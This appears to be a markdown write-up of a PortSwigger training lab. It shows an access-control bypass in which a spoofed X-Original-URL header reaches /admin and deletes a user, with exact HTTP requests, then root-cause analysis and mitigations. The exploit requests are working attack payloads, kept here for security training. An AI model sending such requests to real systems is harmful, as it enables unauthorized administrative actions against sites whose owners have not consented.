@@ -1,0 +1,410 @@
+# HTTP Header-Based Access Control Bypass using `X-Original-URL`
+
+**Lab:** URL-based access control can be circumvented using HTTP headers  
+**Category:** Broken Access Control  
+**Difficulty:** Apprentice  
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application attempted to protect the administrative interface by blocking direct requests to `/admin`. However, the front-end proxy and the back-end application interpreted the request differently.
+
+While the reverse proxy validated the URL present in the HTTP request line, the back-end application trusted the `X-Original-URL` header to determine the requested resource.
+
+By manipulating this header, it was possible to bypass the access control mechanism and invoke privileged administrative functionality.
+
+---
+
+# Vulnerability Classification
+
+| Attribute | Value |
+|-----------|-------|
+| Vulnerability | HTTP Header-Based Access Control Bypass |
+| CWE | CWE-639 – Authorization Bypass Through User-Controlled Key |
+| CWE | CWE-441 – Unintended Proxy or Intermediary ('Confused Deputy') |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+| Severity | High |
+| CVSS v3.1 | 8.8 (High) |
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy Lab
+
+**Protected Resource**
+
+```http
+/admin
+```
+
+---
+
+# Objective
+
+Bypass the access control protecting the administrative interface and delete the user **carlos**.
+
+---
+
+# Methodology
+
+1. Attempt to access the admin panel.
+2. Observe that direct access is blocked.
+3. Test whether the backend trusts alternative routing headers.
+4. Abuse the `X-Original-URL` header.
+5. Access the admin panel.
+6. Invoke the delete functionality.
+
+---
+
+# Initial Enumeration
+
+A direct request to the administrative interface returned an access denied response.
+
+Request:
+
+```http
+GET /admin HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+Response:
+
+```http
+HTTP/2 401 Unauthorized
+```
+
+or
+
+```http
+HTTP/2 403 Forbidden
+```
+
+The minimal response suggested that the request was being blocked by a reverse proxy or front-end security component rather than the application itself.
+
+---
+
+# Detecting Header-Based Routing
+
+The intercepted request was sent to Burp Repeater.
+
+The request line was modified while introducing the `X-Original-URL` header.
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /invalid
+```
+
+The application responded with:
+
+```http
+HTTP/2 404 Not Found
+```
+
+This demonstrated that the backend was processing the path contained in `X-Original-URL` instead of the actual request URI.
+
+---
+
+# Access Control Bypass
+
+The header value was changed to reference the protected resource.
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin
+```
+
+The response returned the administrative interface successfully.
+
+---
+
+# Exploitation
+
+The administrative delete endpoint was invoked by combining:
+
+- A benign request URI.
+- The malicious routing header.
+- The required query parameter.
+
+```http
+GET /?username=carlos HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin/delete
+```
+
+The backend interpreted the request as:
+
+```text
+/admin/delete?username=carlos
+```
+
+The target user was deleted and the laboratory was solved.
+
+---
+
+# Technical Analysis
+
+The architecture can be represented as follows:
+
+```text
+Browser
+   │
+   ▼
+Reverse Proxy
+   │
+Checks:
+GET /
+   │
+Allows request
+   ▼
+Backend
+   │
+Reads:
+X-Original-URL: /admin/delete
+   │
+Executes privileged action
+```
+
+The front-end validated only the request line:
+
+```http
+GET /
+```
+
+while the application itself trusted:
+
+```http
+X-Original-URL
+```
+
+As a result, the authorization decision was made on one path while execution occurred on another.
+
+---
+
+# HTTP Evidence
+
+## Original Request
+
+```http
+GET /admin HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+Response:
+
+```http
+HTTP/2 401 Unauthorized
+```
+
+---
+
+## Header Validation Test
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /invalid
+```
+
+Response:
+
+```http
+HTTP/2 404 Not Found
+```
+
+This confirmed that the backend processed the value of the custom header.
+
+---
+
+## Administrative Access
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin
+```
+
+Administrative interface returned successfully.
+
+---
+
+## Delete Request
+
+```http
+GET /?username=carlos HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin/delete
+```
+
+Result:
+
+```text
+User "carlos" deleted successfully.
+```
+
+---
+
+# Root Cause
+
+The vulnerability originated from inconsistent request processing between infrastructure components.
+
+Specifically:
+
+- The reverse proxy enforced access restrictions using the request URI.
+- The application trusted the `X-Original-URL` header to determine the resource.
+- Authorization was not revalidated after the URL rewrite.
+
+This inconsistency enabled attackers to bypass the protection entirely.
+
+---
+
+# Impact
+
+An attacker could:
+
+- Bypass administrative access restrictions.
+- Execute privileged functionality.
+- Delete users.
+- Modify sensitive data.
+- Access administrative endpoints.
+- Potentially achieve complete application compromise.
+
+---
+
+# Attack Flow
+
+```text
+Attacker
+      │
+      ▼
+GET /
+X-Original-URL: /admin
+      │
+      ▼
+Reverse proxy checks "/"
+      │
+      ▼
+Request allowed
+      │
+      ▼
+Backend trusts X-Original-URL
+      │
+      ▼
+Processes /admin
+      │
+      ▼
+Administrative access granted
+```
+
+---
+
+# Root Cause Diagram
+
+```text
+Client
+   │
+   ▼
+GET /
+   │
+   ▼
+Reverse Proxy
+Checks "/"
+Allows request
+   │
+   ▼
+Backend
+Reads X-Original-URL
+   │
+   ▼
+Processes /admin
+```
+
+---
+
+# Security Recommendations
+
+## Do Not Trust Client-Supplied Routing Headers
+
+Headers such as:
+
+- `X-Original-URL`
+- `X-Rewrite-URL`
+- `X-Forwarded-Prefix`
+
+must never be trusted when received directly from external clients.
+
+These headers should only be generated internally by trusted infrastructure.
+
+---
+
+## Perform Authorization After URL Rewriting
+
+Authorization decisions must be performed against the final resource actually processed by the application.
+
+---
+
+## Strip Internal Headers at the Proxy
+
+Reverse proxies should remove externally supplied internal routing headers.
+
+Example (Nginx):
+
+```nginx
+proxy_set_header X-Original-URL "";
+proxy_set_header X-Rewrite-URL "";
+```
+
+---
+
+## Use a Single Source of Truth
+
+All components in the request path should evaluate the same effective URL before authorizing access.
+
+---
+
+## Log Suspicious Routing Headers
+
+Generate security alerts when external clients send unexpected headers such as:
+
+```text
+X-Original-URL
+X-Rewrite-URL
+X-Forwarded-Prefix
+```
+
+---
+
+# References
+
+- OWASP Top 10 2021 – A01: Broken Access Control
+- CWE-639 – Authorization Bypass Through User-Controlled Key
+- CWE-441 – Unintended Proxy or Intermediary
+- PortSwigger Web Security Academy – Access Control Vulnerabilities
+
+---
+
+# Conclusion
+
+The application was vulnerable to an **HTTP Header-Based Access Control Bypass** because different infrastructure components interpreted the request differently.
+
+The reverse proxy authorized the request based on the visible URL, while the application executed the request using the value contained in the `X-Original-URL` header.
+
+This discrepancy enabled an attacker to bypass administrative restrictions and invoke privileged functionality without authentication.
+
+---
+
+## Key Takeaways
+
+- Never trust client-controlled routing headers.
+- Reverse proxies and applications must authorize the same effective resource.
+- Internal infrastructure headers should be stripped from external requests.
+- Authorization must occur after URL rewriting.
+- Inconsistent request interpretation is a common source of Broken Access Control vulnerabilities.
+
+---
+
+**Lab Status:** ✅ Solved
